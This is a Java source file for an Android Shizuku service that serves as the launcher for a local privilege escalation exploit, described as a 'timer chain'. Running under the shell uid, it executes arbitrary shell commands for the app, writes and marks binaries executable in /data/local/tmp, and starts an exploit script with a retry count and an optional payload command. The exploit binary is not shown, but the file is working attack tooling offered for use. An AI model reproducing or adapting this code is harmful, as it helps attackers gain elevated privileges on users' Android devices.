package dev.ic.timerlpe;

import android.content.Context;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.charset.StandardCharsets;

/**
 * Runs in a process started by the Shizuku server, so its uid and SELinux
 * domain are the server's (uid 2000 / u:r:shell:s0 when Shizuku was started
 * over adb) -- exactly the identity the timer chain was validated with.
 *
 * The app cannot touch /data/local/tmp itself, so all file work happens here,
 * and the exploit is started as a child of this service.
 */
public class IcService extends IIcService.Stub {
    private static final String TMP = "/data/local/tmp/";
    private static final String SHELL = "/system/bin/sh";
    private static final String PATH = "/sbin:/system/bin:/system/xbin";

    public IcService() { }

    // Shizuku v13 prefers a Context constructor when one exists.
    public IcService(Context context) { }

    private static void check(String path) {
        if (path == null || !path.startsWith(TMP) || path.contains(".."))
            throw new IllegalArgumentException("path outside " + TMP);
    }

    @Override
    public String identity() {
        String ctx = "?";
        try (RandomAccessFile f = new RandomAccessFile("/proc/self/attr/current", "r")) {
            byte[] b = new byte[128];
            int n = f.read(b);
            if (n > 0)
                ctx = new String(b, 0, n, StandardCharsets.UTF_8).trim();
        } catch (IOException ignored) { }
        int nl = ctx.indexOf('\0');
        if (nl >= 0)
            ctx = ctx.substring(0, nl);
        return "uid=" + android.os.Process.myUid()
             + " pid=" + android.os.Process.myPid()
             + " ctx=" + ctx;
    }

    @Override
    public String runCmd(String cmd) {
        try {
            Process p = new ProcessBuilder(SHELL, "-c", cmd)
                    .redirectErrorStream(true)
                    .start();
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while (out.size() < 65536 && (n = p.getInputStream().read(buf)) > 0)
                out.write(buf, 0, n);
            p.waitFor();
            return new String(out.toByteArray(), StandardCharsets.UTF_8);
        } catch (Throwable t) {
            return "error " + t;
        }
    }

    @Override
    public void truncate(String path) {
        check(path);
        try (FileOutputStream fo = new FileOutputStream(path, false)) {
            // truncate only
        } catch (IOException e) {
            throw new IllegalStateException("truncate " + path + ": " + e);
        }
    }

    @Override
    public void put(String path, int offset, byte[] data) {
        check(path);
        try (RandomAccessFile f = new RandomAccessFile(path, "rw")) {
            f.seek(offset);
            f.write(data);
        } catch (IOException e) {
            throw new IllegalStateException("write " + path + ": " + e);
        }
    }

    @Override
    public void makeExec(String path) {
        check(path);
        if (!new File(path).setExecutable(true, false))
            throw new IllegalStateException("chmod +x failed: " + path);
    }

    @Override
    public int length(String path) {
        check(path);
        long len = new File(path).length();
        return (int) Math.min(len, Integer.MAX_VALUE);
    }

    @Override
    public byte[] read(String path, int offset, int max) {
        check(path);
        try (RandomAccessFile f = new RandomAccessFile(path, "r")) {
            long len = f.length();
            if (offset < 0 || offset >= len || max <= 0)
                return new byte[0];
            f.seek(offset);
            int n = (int) Math.min(max, len - offset);
            byte[] b = new byte[n];
            int got = f.read(b);
            if (got <= 0)
                return new byte[0];
            if (got == n)
                return b;
            byte[] t = new byte[got];
            System.arraycopy(b, 0, t, 0, got);
            return t;
        } catch (IOException e) {
            return new byte[0];
        }
    }

    @Override
    public String start(String script, String bin, String log, int attempts,
                        String payloadCmd) {
        check(script);
        check(bin);
        check(log);
        try {
            ProcessBuilder pb = new ProcessBuilder(SHELL, script);
            pb.environment().put("PATH", PATH);
            pb.environment().put("IC_BIN", bin);
            pb.environment().put("ATTEMPTS", Integer.toString(attempts));
            if (payloadCmd != null && !payloadCmd.isEmpty())
                pb.environment().put("PAYLOAD_CMD", payloadCmd);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(new File(log)));
            Process p = pb.start();
            return "启动 " + script + " (attempts=" + attempts + ")  " + identity();
        } catch (IOException e) {
            return "启动失败: " + e;
        }
    }
}
